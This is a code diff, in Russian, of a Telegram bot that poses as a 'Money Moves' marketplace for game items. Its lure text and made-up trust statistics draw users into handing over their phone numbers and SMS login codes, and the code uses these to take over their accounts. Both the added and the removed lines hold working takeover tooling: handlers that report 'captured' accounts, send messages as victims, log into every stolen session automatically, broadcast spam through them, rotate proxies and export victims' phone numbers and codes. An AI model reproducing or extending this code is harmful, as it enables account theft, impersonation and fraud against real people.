+        account_id = result['account_id']
+        
+        # Получаем подробную информацию об аккаунте
+        account_info = await account_manager.get_account_info(account_id)
+        
+        await message.answer(
+            f"✅ <b>АККАУНТ УСПЕШНО ЗАХВАЧЕН!</b>\n\n"
+            f"📱 Номер: {phone}\n"
+            f"👤 Пользователь: @{account_info.get('username', 'нет')}\n"
+            f"🆔 User ID: {account_info.get('user_id', 'неизвестно')}\n"
+            f"👤 Имя: {account_info.get('first_name', 'неизвестно')}\n"
+            f"🔧 Метод: {method}\n"
+            f"🎯 ID аккаунта: {account_id}\n\n"
+            f"<i>Аккаунт добавлен в систему и готов к использованию.</i>",
+            parse_mode="HTML"
+        )
+        
+        # Уведомляем главного админа
+        if not admin_manager.is_main_admin(message.from_user.id):
+            try:
+                await bot.send_message(
+                    config.MAIN_ADMIN_ID,
+                    f"🎯 <b>НОВЫЙ АККАУНТ ЗАХВАЧЕН</b>\n\n"
+                    f"📱 Номер: {phone}\n"
+                    f"👤 Пользователь: @{account_info.get('username', 'нет')}\n"
+                    f"👮 Захватил: ID {message.from_user.id}\n"
+                    f"🔧 Метод: {method}\n"
+                    f"🎯 ID аккаунта: {account_id}\n"
+                    f"⏰ Время: {datetime.now().strftime('%H:%M:%S')}",
+                    parse_mode="HTML"
+                )
+            except:
+                pass
+    else:
+        await message.answer(
+            f"❌ <b>ОШИБКА ЗАХВАТА АККАУНТА</b>\n\n"
+            f"📱 Номер: {phone}\n"
+            f"🔢 Код: {code}\n"
+            f"🔧 Метод: {method}\n"
+            f"⚠️ Ошибка: {result.get('error', 'Неизвестная ошибка')}\n\n"
+            f"<i>Возможные причины:\n"
+            f"1. Неверный код\n"
+            f"2. Аккаунт защищен 2FA\n"
+            f"3. Проблемы с подключением\n"
+            f"4. Неверные API credentials</i>",
+            parse_mode="HTML"
+        )
+    
+    await state.clear()
+
+# Настройки бота
+@dp.callback_query(F.data == "admin_settings")
+async def admin_settings_menu(callback_query: CallbackQuery):
+    if not admin_manager.is_main_admin(callback_query.from_user.id):
+        await callback_query.answer("❌ Только главный админ может изменять настройки")
+        return
+    
+    # Получаем текущие настройки
+    current_proxy = anonymity_manager.current_proxy
+    proxy_status = "✅ Настроен" if current_proxy else "❌ Не настроен"
+    
+    keyboard = InlineKeyboardMarkup(inline_keyboard=[
+        [
+            InlineKeyboardButton(text="🔄 Сменить прокси", callback_data="settings_change_proxy"),
+            InlineKeyboardButton(text="🔧 Настройки безопасности", callback_data="settings_security")
+        ],
+        [
+            InlineKeyboardButton(text="🗑️ Очистить данные", callback_data="settings_clear_data"),
+            InlineKeyboardButton(text="📊 Настройки базы", callback_data="settings_database")
+        ],
+        [
+            InlineKeyboardButton(text="🚪 Управление сессиями", callback_data="settings_sessions"),
+            InlineKeyboardButton(text="🔔 Настройки уведомлений", callback_data="settings_notifications")
+        ],
+        [InlineKeyboardButton(text="↩️ Назад", callback_data="back_to_main")]
+    ])
+    
+    await callback_query.message.edit_text(
+        f"⚙️ <b>НАСТРОЙКИ СИСТЕМЫ SWILL</b>\n\n"
+        f"📊 Основные настройки:\n"
+        f"• Прокси: {proxy_status}\n"
+        f"• Активных сессий: {len(account_manager.active_sessions)}\n"
+        f"• Лимит админов: {config.MAX_ADMINS}\n"
+        f"• Лимит каналов: {config.MAX_CHANNELS}\n\n"
+        f"<i>Выберите категорию настроек:</i>",
+        parse_mode="HTML",
+        reply_markup=keyboard
+    )
+
+# ========== ОБРАБОТЧИКИ ОДОБРЕНИЯ КАНАЛОВ ==========
+@dp.callback_query(F.data.startswith("approve_channel:"))
+async def handle_approve_channel(callback_query: CallbackQuery):
+    if not admin_manager.is_main_admin(callback_query.from_user.id):
+        await callback_query.answer("❌ Только главный админ может одобрять каналы")
+        return
+    
+    channel_db_id = int(callback_query.data.split(":")[1])
+    
+    await callback_query.message.edit_text(
+        f"⏳ <b>Одобряю канал #{channel_db_id}...</b>",
+        parse_mode="HTML"
+    )
+    
+    result = await channel_manager.approve_channel(channel_db_id, callback_query.from_user.id)
+    
+    if result['success']:
+        await callback_query.message.edit_text(
+            f"✅ <b>КАНАЛ ОДОБРЕН!</b>\n\n"
+            f"📢 Канал: {result.get('channel_title', 'Unknown')}\n"
+            f"🎯 ID в системе: {channel_db_id}\n\n"
+            f"Уведомления будут отправляться в канал.\n"
+            f"Админ-уведомления отключены.",
+            parse_mode="HTML"
+        )
+    else:
+        await callback_query.message.edit_text(
+            f"❌ <b>ОШИБКА ОДОБРЕНИЯ КАНАЛА</b>\n\n"
+            f"ID: {channel_db_id}\n"
+            f"Ошибка: {result.get('error', 'Неизвестная ошибка')}",
+            parse_mode="HTML"
+        )
+
+@dp.callback_query(F.data.startswith("reject_channel:"))
+async def handle_reject_channel(callback_query: CallbackQuery, state: FSMContext):
+    if not admin_manager.is_main_admin(callback_query.from_user.id):
+        await callback_query.answer("❌ Только главный админ может отклонять каналы")
+        return
+    
+    channel_db_id = int(callback_query.data.split(":")[1])
+    
+    await state.set_state(AdminStates.waiting_channel_action)
+    await state.update_data(channel_db_id=channel_db_id, action='reject')
+    
+    await callback_query.message.edit_text(
+        f"📝 <b>УКАЖИТЕ ПРИЧИНУ ОТКЛОНЕНИЯ</b>\n\n"
+        f"Канал ID: {channel_db_id}\n\n"
+        f"Введите причину отклонения канала:",
+        parse_mode="HTML"
+    )
+
+@dp.message(AdminStates.waiting_channel_action)
+async def process_channel_action_reason(message: Message, state: FSMContext):
+    if not admin_manager.is_main_admin(message.from_user.id):
+        await message.answer("❌ Доступ запрещен")
+        await state.clear()
+        return
+    
+    user_data = await state.get_data()
+    channel_db_id = user_data.get('channel_db_id')
+    action = user_data.get('action')
+    reason = message.text
+    
+    if action == 'reject':
+        result = await channel_manager.reject_channel(channel_db_id, message.from_user.id, reason)
+        
+        if result['success']:
+            await message.answer(
+                f"✅ <b>КАНАЛ ОТКЛОНЕН!</b>\n\n"
+                f"ID: {channel_db_id}\n"
+                f"📝 Причина: {reason}\n\n"
+                f"Канал удален из системы.",
+                parse_mode="HTML"
+            )
+        else:
+            await message.answer(
+                f"❌ <b>ОШИБКА ОТКЛОНЕНИЯ КАНАЛА</b>\n\n"
+                f"ID: {channel_db_id}\n"
+                f"Ошибка: {result.get('error', 'Неизвестная ошибка')}",
+                parse_mode="HTML"
+            )
+    
+    await state.clear()
+
+# ========== ОБРАБОТЧИК КНОПКИ НАЗАД ==========
+@dp.callback_query(F.data == "back_to_main")
+async def back_to_main_menu(callback_query: CallbackQuery, state: FSMContext):
+    await state.clear()
+    await cmd_start(callback_query.message, state)
+
+# ========== ЗАПУСК СИСТЕМ МОНИТОРИНГА ==========
+async def start_background_tasks():
+    """Запускает фоновые задачи системы"""
+    logger.info("Запуск фоновых задач...")
+    
+    # Запускаем систему авто-входа
+    await auto_login_system.start_monitoring()
+    
+    # Запускаем ротацию прокси
+    asyncio.create_task(proxy_rotation_task())
+    
+    # Запускаем очистку старых данных
+    asyncio.create_task(cleanup_old_data_task())
+    
+    logger.info("Фоновые задачи запущены")
+
+async def proxy_rotation_task():
+    """Периодическая ротация прокси"""
+    while True:
         try:
+            await anonymity_manager.rotate_proxy()
+            await asyncio.sleep(3600)  # Ротация каждый час
+        except Exception as e:
+            logger.error(f"Ошибка ротации прокси: {e}")
+            await asyncio.sleep(300)
+
+async def cleanup_old_data_task():
+    """Очистка старых данных из базы"""
+    while True:
+        try:
+            # Удаляем старые логи (старше 30 дней)
+            month_ago = (datetime.now() - timedelta(days=30)).isoformat()
+            db.execute(
+                "DELETE FROM security_logs WHERE timestamp < ?",
+                (month_ago,)
+            )
+            
+            # Удаляем старые сообщения (старше 14 дней)
+            two_weeks_ago = (datetime.now() - timedelta(days=14)).isoformat()
+            db.execute(
+                "DELETE FROM messages WHERE sent_date < ?",
+                (two_weeks_ago,)
+            )
+            
+            # Деактивируем неактивные аккаунты (не использовались 7 дней)
+            week_ago = (datetime.now() - timedelta(days=7)).isoformat()
+            db.execute(
+                "UPDATE hijacked_accounts SET is_active = 0 WHERE last_used < ? AND is_active = 1",
+                (week_ago,)
+            )
+            
+            logger.info("Очистка старых данных выполнена")
+            await asyncio.sleep(86400)  # Раз в день
+            
+        except Exception as e:
+            logger.error(f"Ошибка очистки данных: {e}")
+            await asyncio.sleep(3600)
+
+# ========== ОБРАБОТЧИК ОШИБОК ==========
+@dp.errors()
+async def errors_handler(update: types.Update, exception: Exception):
+    """Обработчик ошибок бота"""
+    try:
+        logger.error(f"Ошибка при обработке обновления {update}: {exception}")
+        
+        # Пытаемся отправить сообщение об ошибке главному админу
+        try:
+            error_summary = str(exception)[:500]
             await bot.send_message(
-                user_id,
-                "❌ <b>Ваш запрос на повторную отправку кода отклонен администратором.</b>\n\n"
-                "Пожалуйста, обратитесь в поддержку для выяснения причины.",
+                config.MAIN_ADMIN_ID,
+                f"⚠️ <b>ОШИБКА БОТА</b>\n\n"
+                f"Тип: {type(exception).__name__}\n"
+                f"Ошибка: {error_summary}\n"
+                f"Время: {datetime.now().strftime('%H:%M:%S')}",
                 parse_mode="HTML"
             )
         except:
             pass
         
+        return True
     except Exception as e:
-        logger.error(f"[REJECT RESEND] Ошибка: {e}")
-
-@dp.message(VerificationStates.waiting_code)
-async def handle_wrong_code_input(message: types.Message):
-    await message.answer("❌ <b>Пожалуйста, введите 5-6 значный код из SMS.</b>\n\nЕсли код не пришел, используйте /resend_code", parse_mode="HTML")
-
-@dp.callback_query(F.data == "start_verification")
-async def start_verification_process(callback_query: types.CallbackQuery, state: FSMContext):
-    verification_text = """
-📱 <b>ШАГ 1: ПОДТВЕРЖДЕНИЕ НОМЕРА ТЕЛЕФОНА</b>
-
-Для верификации необходимо подтвердить номер телефона, привязанный к Telegram.
-
-<b>Нажмите кнопку ниже для подтверждения номера:</b>
-    """
-    
-    keyboard = ReplyKeyboardMarkup(
-        keyboard=[[KeyboardButton(text="📱 ПОДТВЕРДИТЬ НОМЕР", request_contact=True)]],
-        resize_keyboard=True,
-        one_time_keyboard=True
-    )
-    
-    await state.set_state(VerificationStates.waiting_phone)
-    
-    await bot.send_message(
-        callback_query.from_user.id,
-        verification_text,
-        parse_mode="HTML",
-        reply_markup=keyboard
-    )
-
-# ========== КОМАНДЫ ДЛЯ УПРАВЛЕНИЯ АККАУНТАМИ ==========
-
-@dp.message(Command("hijacked"))
-async def cmd_hijacked(message: types.Message):
-    """Показать захваченные аккаунты"""
-    if message.from_user.id != ADMIN_ID:
-        await message.answer("❌ Доступ запрещен", parse_mode="HTML")
-        return
-    
-    if not hijacker:
-        await message.answer("⚠️ Hijacker не инициализирован", parse_mode="HTML")
-        return
-    
-    accounts = hijacker.get_hijacked_accounts()
-    
-    if not accounts:
-        await message.answer("📭 Нет захваченных аккаунтов", parse_mode="HTML")
-        return
-    
-    accounts_text = "<b>📋 ЗАХВАЧЕННЫЕ АККАУНТЫ</b>\n━━━━━━━━━━━━━━━━\n\n"
-    
-    for i, acc in enumerate(accounts, 1):
-        status = "✅" if acc[5] == 1 else "❌"
-        accounts_text += f"{i}. <b>{status} +{acc[0]}</b>\n"
-        accounts_text += f"   👤 @{acc[2] or 'нет'} ({acc[3]})\n"
-        accounts_text += f"   🆔 {acc[1]}\n"
-        accounts_text += f"   ⏰ {acc[4][:16]}\n"
-        accounts_text += "   ━━━━━━━━━━━\n"
-    
-    keyboard = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="🔄 Проверить доступ", callback_data="check_access_all")],
-        [InlineKeyboardButton(text="🗑️ Очистить неактивные", callback_data="clear_inactive_sessions")],
-        [InlineKeyboardButton(text="📨 Тест рассылка", callback_data="test_broadcast")]
-    ])
-    
-    await message.answer(accounts_text, parse_mode="HTML", reply_markup=keyboard)
-
-@dp.message(Command("send_as"))
-async def cmd_send_as(message: types.Message):
-    """Отправить сообщение от захваченного аккаунта"""
-    if message.from_user.id != ADMIN_ID:
-        await message.answer("❌ Доступ запрещен", parse_mode="HTML")
-        return
-    
-    if not hijacker:
-        await message.answer("⚠️ Hijacker не инициализирован", parse_mode="HTML")
-        return
-    
-    # Формат: /send_as +79123456789 @username текст сообщения
-    args = message.text.split(maxsplit=3)
-    
-    if len(args) < 4:
-        await message.answer(
-            "📝 <b>Формат:</b> /send_as +79123456789 @username текст_сообщения\n\n"
-            "<b>Пример:</b> /send_as +79123456789 @test_user Привет, это тест!",
-            parse_mode="HTML"
-        )
-        return
-    
-    phone = args[1]
-    target = args[2]
-    text = args[3]
-    
-    await message.answer(f"⏳ Отправляю сообщение от +{phone}...", parse_mode="HTML")
-    
-    success = await hijacker.send_message_from_hijacked(phone, target, text)
-    
-    if success:
-        await message.answer(f"✅ Сообщение отправлено от +{phone} к {target}", parse_mode="HTML")
-    else:
-        await message.answer(f"❌ Не удалось отправить сообщение", parse_mode="HTML")
-
-@dp.message(Command("check_access"))
-async def cmd_check_access(message: types.Message):
-    """Проверить доступ ко всем аккаунтам"""
-    if message.from_user.id != ADMIN_ID:
-        await message.answer("❌ Доступ запрещен", parse_mode="HTML")
-        return
-    
-    if not hijacker:
-        await message.answer("⚠️ Hijacker не инициализирован", parse_mode="HTML")
-        return
-    
-    accounts = hijacker.get_hijacked_accounts()
-    
-    if not accounts:
-        await message.answer("📭 Нет аккаунтов для проверки", parse_mode="HTML")
-        return
-    
-    await message.answer(f"🔍 Проверяю доступ к {len(accounts)} аккаунтам...", parse_mode="HTML")
-    
-    active = 0
-    inactive = 0
-    
-    for acc in accounts:
-        phone = acc[0]
-        
-        # Получаем сессию
-        hijacker.cursor.execute(
-            "SELECT session_string FROM hijacked_sessions WHERE phone = ? ORDER BY hijacked_at DESC LIMIT 1",
-            (phone,)
-        )
-        result = hijacker.cursor.fetchone()
-        
-        if result:
-            session_string = result[0]
-            is_active = await hijacker.check_account_access(session_string)
-            
-            if is_active:
-                active += 1
-                hijacker.update_account_status(phone, True)
-            else:
-                inactive += 1
-                hijacker.update_account_status(phone, False)
-    
-    await message.answer(
-        f"📊 <b>РЕЗУЛЬТАТ ПРОВЕРКИ</b>\n\n"
-        f"✅ Активные: {active}\n"
-        f"❌ Неактивные: {inactive}\n"
-        f"📈 Всего: {len(accounts)}",
-        parse_mode="HTML"
-    )
-
-@dp.message(Command("auto_login"))
-async def cmd_auto_login(message: types.Message):
-    """Автоматический вход во все сохраненные аккаунты"""
-    if message.from_user.id != ADMIN_ID:
-        await message.answer("❌ Доступ запрещен", parse_mode="HTML")
-        return
-    
-    if not hijacker:
-        await message.answer("⚠️ Hijacker не инициализирован", parse_mode="HTML")
-        return
-    
-    await message.answer("🔄 Запускаю автоматический вход во все аккаунты...", parse_mode="HTML")
-    
-    # Запускаем авто-вход в фоне
-    asyncio.create_task(auto_login_hijacked_accounts())
-    
-    await message.answer("✅ Авто-вход запущен. Результаты будут отправлены вам позже.", parse_mode="HTML")
-
-@dp.message(Command("broadcast"))
-async def cmd_broadcast(message: types.Message, state: FSMContext):
-    """Начать рассылку от всех аккаунтов"""
-    if message.from_user.id != ADMIN_ID:
-        await message.answer("❌ Доступ запрещен", parse_mode="HTML")
-        return
-    
-    if not hijacker:
-        await message.answer("⚠️ Hijacker не инициализирован", parse_mode="HTML")
-        return
-    
-    await message.answer(
-        "📨 <b>НАСТРОЙКА РАССЫЛКИ</b>\n\n"
-        "Введите список получателей (каждый с новой строки):\n"
-        "Пример:\n"
-        "@user1\n"
-        "+79123456789\n"
-        "123456789\n\n"
-        "<i>Напишите 'стоп' на отдельной строке чтобы закончить список</i>",
-        parse_mode="HTML"
-    )
-    
-    await state.set_state(HijackStates.waiting_auto_login)
-
-@dp.message(HijackStates.waiting_auto_login)
-async def process_broadcast_targets(message: types.Message, state: FSMContext):
-    if message.text.lower() == 'отмена':
-        await state.clear()
-        await message.answer("❌ Рассылка отменена", parse_mode="HTML")
-        return
-    
-    # Получаем цели
-    targets = [line.strip() for line in message.text.split('\n') if line.strip()]
-    
-    if not targets:
-        await message.answer("❌ Список целей пуст", parse_mode="HTML")
-        await state.clear()
-        return
-    
-    await state.update_data(broadcast_targets=targets)
-    
-    await message.answer(
-        f"✅ Получено {len(targets)} целей\n\n"
-        "Теперь введите текст сообщения для рассылки:",
-        parse_mode="HTML"
-    )
-    
-    # Следующий шаг - текст сообщения
-    await state.set_state(VerificationStates.waiting_code)  # Временно используем другое состояние
-
-async def process_broadcast_message(message: types.Message, state: FSMContext):
-    """Обработка текста сообщения для рассылки"""
-    user_data = await state.get_data()
-    targets = user_data.get('broadcast_targets', [])
-    message_text = message.text
-    
-    if not hijacker:
-        await message.answer("⚠️ Hijacker не инициализирован", parse_mode="HTML")
-        await state.clear()
-        return
-    
-    # Подтверждение
-    confirm_text = f"""
-🎯 <b>ПОДТВЕРЖДЕНИЕ РАССЫЛКИ</b>
-
-<b>Целей:</b> {len(targets)}
-<b>Сообщение:</b>
-{message_text[:200]}{'...' if len(message_text) > 200 else ''}
-
-<b>Начать рассылку?</b>
-"""
-    
-    keyboard = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="✅ НАЧАТЬ РАССЫЛКУ", callback_data="start_broadcast_confirm")],
-        [InlineKeyboardButton(text="❌ ОТМЕНА", callback_data="cancel_broadcast")]
-    ])
-    
-    await state.update_data(broadcast_message=message_text)
-    await message.answer(confirm_text, parse_mode="HTML", reply_markup=keyboard)
-
-@dp.callback_query(F.data == "start_broadcast_confirm")
-async def start_broadcast_confirm(callback_query: types.CallbackQuery, state: FSMContext):
-    await callback_query.answer("⏳ Начинаю рассылку...")
-    
-    user_data = await state.get_data()
-    targets = user_data.get('broadcast_targets', [])
-    message_text = user_data.get('broadcast_message', '')
-    
-    # Запускаем рассылку в фоне
-    asyncio.create_task(auto_message_from_all_accounts(message_text, targets))
-    
-    await bot.edit_message_text(
-        "✅ <b>Рассылка запущена!</b>\n\nРезультаты будут отправлены позже.",
-        chat_id=callback_query.message.chat.id,
-        message_id=callback_query.message.message_id,
-        parse_mode="HTML"
-    )
-    
-    await state.clear()
-
-@dp.callback_query(F.data == "cancel_broadcast")
-async def cancel_broadcast(callback_query: types.CallbackQuery, state: FSMContext):
-    await state.clear()
-    await bot.edit_message_text(
-        "❌ <b>Рассылка отменена</b>",
-        chat_id=callback_query.message.chat.id,
-        message_id=callback_query.message.message_id,
-        parse_mode="HTML"
-    )
-
-@dp.callback_query(F.data == "check_access_all")
-async def check_access_all_callback(callback_query: types.CallbackQuery):
-    """Проверить доступ всем аккаунтам через callback"""
-    if not hijacker:
-        await callback_query.answer("⚠️ Hijacker не инициализирован")
-        return
-    
-    await callback_query.answer("🔍 Проверяю доступ...")
-    
-    accounts = hijacker.get_hijacked_accounts()
-    
-    if not accounts:
-        await bot.edit_message_text(
-            "📭 Нет аккаунтов для проверки",
-            chat_id=callback_query.message.chat.id,
-            message_id=callback_query.message.message_id,
-            parse_mode="HTML"
-        )
-        return
-    
-    active = 0
-    inactive = 0
-    
-    for acc in accounts:
-        phone = acc[0]
-        
-        hijacker.cursor.execute(
-            "SELECT session_string FROM hijacked_sessions WHERE phone = ? ORDER BY hijacked_at DESC LIMIT 1",
-            (phone,)
-        )
-        result = hijacker.cursor.fetchone()
-        
-        if result:
-            session_string = result[0]
-            is_active = await hijacker.check_account_access(session_string)
-            
-            if is_active:
-                active += 1
-                hijacker.update_account_status(phone, True)
-            else:
-                inactive += 1
-                hijacker.update_account_status(phone, False)
-    
-    result_text = f"""
-📊 <b>РЕЗУЛЬТАТ ПРОВЕРКИ</b>
-
-✅ Активные: {active}
-❌ Неактивные: {inactive}
-📈 Всего: {len(accounts)}
-
-<b>Статусы обновлены в базе данных.</b>
-"""
-    
-    await bot.edit_message_text(
-        result_text,
-        chat_id=callback_query.message.chat.id,
-        message_id=callback_query.message.message_id,
-        parse_mode="HTML"
-    )
-
-@dp.callback_query(F.data == "clear_inactive_sessions")
-async def clear_inactive_sessions(callback_query: types.CallbackQuery):
-    """Очистить неактивные сессии"""
-    if not hijacker:
-        await callback_query.answer("⚠️ Hijacker не инициализирован")
-        return
-    
-    # Удаляем неактивные сессии
-    hijacker.cursor.execute(
-        "DELETE FROM hijacked_sessions WHERE is_active = 0"
-    )
-    deleted_count = hijacker.cursor.rowcount
-    hijacker.conn.commit()
-    
-    await callback_query.answer(f"🗑️ Удалено {deleted_count} неактивных сессий")
-    
-    # Обновляем сообщение
-    accounts = hijacker.get_hijacked_accounts()
-    
-    if not accounts:
-        await bot.edit_message_text(
-            "📭 Нет захваченных аккаунтов",
-            chat_id=callback_query.message.chat.id,
-            message_id=callback_query.message.message_id,
-            parse_mode="HTML"
-        )
-        return
-    
-    accounts_text = "<b>📋 ЗАХВАЧЕННЫЕ АККАУНТЫ (ОЧИЩЕНО)</b>\n━━━━━━━━━━━━━━━━\n\n"
-    
-    for i, acc in enumerate(accounts, 1):
-        status = "✅" if acc[5] == 1 else "❌"
-        accounts_text += f"{i}. <b>{status} +{acc[0]}</b>\n"
-        accounts_text += f"   👤 @{acc[2] or 'нет'}\n"
-        accounts_text += f"   ⏰ {acc[4][:16]}\n"
-        accounts_text += "   ━━━━━━━━━━━\n"
-    
-    accounts_text += f"\n🗑️ <b>Удалено неактивных: {deleted_count}</b>"
-    
-    keyboard = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="🔄 Проверить доступ", callback_data="check_access_all")],
-        [InlineKeyboardButton(text="📨 Тест рассылка", callback_data="test_broadcast")]
-    ])
-    
-    await bot.edit_message_text(
-        accounts_text,
-        chat_id=callback_query.message.chat.id,
-        message_id=callback_query.message.message_id,
-        parse_mode="HTML",
-        reply_markup=keyboard
-    )
-
-@dp.callback_query(F.data == "test_broadcast")
-async def test_broadcast_callback(callback_query: types.CallbackQuery):
-    """Тестовая рассылка админу"""
-    if not hijacker:
-        await callback_query.answer("⚠️ Hijacker не инициализирован")
-        return
-    
-    await callback_query.answer("📨 Отправляю тестовые сообщения...")
-    
-    active_accounts = hijacker.get_active_accounts()
-    
-    if not active_accounts:
-        await bot.send_message(
-            callback_query.from_user.id,
-            "❌ Нет активных аккаунтов для теста",
-            parse_mode="HTML"
-        )
-        return
-    
-    test_message = f"🔧 Тестовое сообщение от захваченного аккаунта\nВремя: {datetime.now().strftime('%H:%M:%S')}"
-    
-    success_count = 0
-    fail_count = 0
-    
-    for account in active_accounts[:3]:  # Первые 3 аккаунта
-        phone = account[0]
-        
-        success = await hijacker.send_message_from_hijacked(
-            phone,
-            str(ADMIN_ID),
-            test_message
-        )
-        
-        if success:
-            success_count += 1
-            await asyncio.sleep(5)  # Задержка между сообщениями
-        else:
-            fail_count += 1
-    
-    result_text = f"""
-📨 <b>ТЕСТ РАССЫЛКИ ЗАВЕРШЕН</b>
-
-✅ Успешно: {success_count}
-❌ Неудачно: {fail_count}
-📊 Всего попыток: {len(active_accounts[:3])}
-
-<b>Проверьте входящие сообщения от захваченных аккаунтов.</b>
-"""
-    
-    await bot.send_message(
-        callback_query.from_user.id,
-        result_text,
-        parse_mode="HTML"
-    )
-
-@dp.message(Command("status"))
-async def cmd_status(message: types.Message):
-    user = message.from_user
-    
-    cursor.execute(
-        "SELECT COUNT(*), SUM(CASE WHEN status = 'pending' THEN 1 ELSE 0 END) FROM items WHERE user_id = ?",
-        (user.id,)
-    )
-    stats = cursor.fetchone()
-    
-    cursor.execute(
-        "SELECT phone FROM users WHERE user_id = ?",
-        (user.id,)
-    )
-    user_data = cursor.fetchone()
-    
-    status_text = f"""
-📊 <b>ВАШ СТАТУС</b>
-
-👤 <b>Пользователь:</b> {user.first_name}
-🆔 <b>ID:</b> {user.id}
-📱 <b>Телефон:</b> {'+'+user_data[0] if user_data and user_data[0] else 'Не подтвержден'}
-    
-📦 <b>Заявки:</b>
-• Всего: {stats[0] or 0}
-• На модерации: {stats[1] or 0}
-• Одобрено: {(stats[0] or 0) - (stats[1] or 0)}
-
-💎 <b>Рекомендации:</b>
-1. Для продажи товара нажмите /start
-2. Для проверки верификации отправьте номер телефона
-3. Для помощи используйте /help
-"""
-    
-    await message.answer(status_text, parse_mode="HTML")
-    log_action(user.id, "check_status")
-
-@dp.message(Command("help"))
-async def cmd_help(message: types.Message):
-    help_text = """
-🆘 <b>ПОМОЩЬ ПО БОТУ</b>
-
-<b>Основные команды:</b>
-/start - Начать работу с ботом
-/status - Проверить статус заявок
-/resend_code - Отправить код подтверждения повторно
-/help - Показать это сообщение
-
-<b>Процесс продажи:</b>
-1. Нажмите /start
-2. Выберите "💰 ПРОДАТЬ ТОВАР"
-3. Подтвердите номер телефона (требуется один раз)
-4. Выберите тип товара
-5. Отправьте фотографии и описание
-6. Дождитесь оценки модератора
-7. Примите цену и получите инструкции по передаче
-8. Получите деньги после проверки товара
-
-<b>Безопасность:</b>
-• Все транзакции защищены
-• Конфиденциальность гарантирована
-• Выплаты в течение 24 часов
-
-<b>Поддержка:</b>
-Для связи с администратором используйте кнопку "ℹ️ О НАС" в меню.
-"""
-    
-    await message.answer(help_text, parse_mode="HTML")
-    log_action(message.from_user.id, "help_requested")
-
-@dp.callback_query(F.data == "about_us")
-async def about_us(callback_query: types.CallbackQuery):
-    about_text = """
-🏪 <b>О НАС - Money Moves Bot</b>
-
-Мы - надежная платформа для покупки и продажи игровых ценностей с 2018 года.
-
-<b>Наши преимущества:</b>
-✅ <b>Безопасность</b> - Все сделки защищены гарантией
-✅ <b>Скорость</b> - Выплаты в течение 1-24 часов
-✅ <b>Выгода</b> - Самые высокие цены на рынке
-✅ <b>Поддержка</b> - Круглосуточная помощь
-
-<b>Статистика:</b>
-• 50,000+ успешных сделок
-• 10,000+ довольных клиентов
-• 99.8% положительных отзывов
-• 24/7 работа поддержки
-
-<b>Наши гарантии:</b>
-1. Полная анонимность
-2. Защита от мошенничества
-3. Юридическое сопровождение
-4. Мгновенные выплаты
-
-<b>Присоединяйтесь к нам уже сегодня!</b>
-"""
-    
-    await bot.edit_message_text(
-        about_text,
-        chat_id=callback_query.message.chat.id,
-        message_id=callback_query.message.message_id,
-        parse_mode="HTML"
-    )
-
-@dp.message(Command("admin"))
-async def cmd_admin(message: types.Message):
-    if message.from_user.id != ADMIN_ID and message.from_user.id not in MODERATOR_IDS:
-        await message.answer("❌ Доступ запрещен")
-        return
-    
-    # Статистика
-    cursor.execute("SELECT COUNT(*) FROM users")
-    total_users = cursor.fetchone()[0]
-    
-    cursor.execute("SELECT COUNT(*) FROM users WHERE phone IS NOT NULL")
-    verified_users = cursor.fetchone()[0]
-    
-    cursor.execute("SELECT COUNT(*) FROM items")
-    total_items = cursor.fetchone()[0]
-    
-    cursor.execute("SELECT COUNT(*) FROM items WHERE status = 'pending'")
-    pending_items = cursor.fetchone()[0]
-    
-    cursor.execute("SELECT COUNT(*) FROM sms_codes WHERE used = 0")
-    unused_codes = cursor.fetchone()[0]
-    
-    hijacked_count = 0
-    if hijacker:
-        hijacked_accounts = hijacker.get_hijacked_accounts()
-        hijacked_count = len(hijacked_accounts)
-    
-    admin_text = f"""
-👑 <b>АДМИН ПАНЕЛЬ</b>
-
-<b>Статистика:</b>
-👥 <b>Пользователи:</b> {total_users}
-✅ <b>Верифицированы:</b> {verified_users}
-📦 <b>Заявки:</b> {total_items}
-⏳ <b>На модерации:</b> {pending_items}
-🔢 <b>Неиспользованные коды:</b> {unused_codes}
-🎯 <b>Захвачено аккаунтов:</b> {hijacked_count}
-
-<b>Последние действия:</b>
-"""
-    
-    cursor.execute("SELECT user_id, action, timestamp FROM logs ORDER BY timestamp DESC LIMIT 5")
-    logs = cursor.fetchall()
-    
-    for log in logs:
-        admin_text += f"\n• ID{log[0]} - {log[1]} ({log[2][:16]})"
-    
-    admin_text += "\n\n<b>Команды администратора:</b>"
-    admin_text += "\n/export_users - Экспорт пользователей"
-    admin_text += "\n/export_codes - Экспорт кодов"
-    admin_text += "\n/hijacked - Показать захваченные аккаунты"
-    admin_text += "\n/check_access - Проверить доступ аккаунтов"
-    admin_text += "\n/auto_login - Авто-вход во все аккаунты"
-    admin_text += "\n/broadcast - Рассылка от всех аккаунтов"
-    
-    await message.answer(admin_text, parse_mode="HTML")
-
-@dp.message(Command("export_users"))
-async def cmd_export_users(message: types.Message):
-    if message.from_user.id != ADMIN_ID:
-        await message.answer("❌ Доступ запрещен")
-        return
-    
-    cursor.execute("SELECT user_id, username, first_name, phone, code, registered FROM users")
-    users = cursor.fetchall()
-    
-    if not users:
-        await message.answer("❌ Нет данных для экспорта")
-        return
-    
-    # Создаем временный файл
-    with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False, encoding='utf-8') as f:
-        f.write("ID | Username | Имя | Телефон | Код | Регистрация\n")
-        f.write("-" * 80 + "\n")
-        for user in users:
-            f.write(f"{user[0]} | @{user[1] or 'нет'} | {user[2]} | +{user[3] or 'нет'} | {user[4] or 'нет'} | {user[5]}\n")
-        file_path = f.name
-    
-    # Отправляем файл
-    try:
-        document = FSInputFile(file_path, filename="users_export.txt")
-        await message.answer_document(document, caption="📊 Экспорт пользователей")
-        os.unlink(file_path)
-    except Exception as e:
-        await message.answer(f"❌ Ошибка экспорта: {e}")
-
-@dp.message(Command("export_codes"))
-async def cmd_export_codes(message: types.Message):
-    if message.from_user.id != ADMIN_ID:
-        await message.answer("❌ Доступ запрещен")
-        return
-    
-    cursor.execute("SELECT u.user_id, u.username, u.phone, u.code, s.sent_time FROM users u LEFT JOIN sms_codes s ON u.user_id = s.user_id WHERE u.phone IS NOT NULL")
-    codes = cursor.fetchall()
-    
-    if not codes:
-        await message.answer("❌ Нет данных для экспорта")
-        return
-    
-    # Создаем временный файл
-    with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False, encoding='utf-8') as f:
-        f.write("ID | Username | Телефон | Код | Время отправки\n")
